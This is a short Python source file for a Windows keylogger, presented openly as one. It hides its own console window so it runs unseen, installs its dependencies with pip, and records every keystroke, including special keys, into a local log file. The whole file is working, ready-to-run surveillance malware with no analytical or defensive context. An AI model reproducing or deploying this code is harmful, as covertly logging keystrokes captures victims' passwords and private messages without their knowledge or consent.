import subprocess
import sys
import win32console
import win32gui
from pynput import keyboard

class Keylogger:
    def __init__(self, keylog_file):
        self.keylog_file = keylog_file
        self.install_packages()
        self.hide_console()

    def install_packages(self):
        packages = ['pywin32', 'pynput']
        
        for package in packages:
            try:
                __import__(package)
            except ImportError:
                print(f"{package} not installed. Installing...!")
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

    def hide_console(self):
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

    def on_press(self, key):
        try:
            if key == keyboard.Key.enter:
                keylog = '\n'
            elif key == keyboard.Key.backspace:
                keylog = '<BACKSPACE>'
            elif key == keyboard.Key.space:
                keylog = ' '
            elif hasattr(key, 'char') and key.char is not None:
                if key.char.isprintable():
                    keylog = key.char
                else:
                    keylog = f'<{key.name}>'
            else:
                keylog = f'<{key.name}>'
        except AttributeError:
            keylog = f'<{key.name}>'
        
        with open(self.keylog_file, 'a') as f:
            f.write(keylog)

    def on_release(self, key):
        pass

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    # Specify the path where the keylogger output will be saved
    keylog_file = r'c:\path\to\your\key.log'
    keylogger = Keylogger(keylog_file)
    keylogger.start()
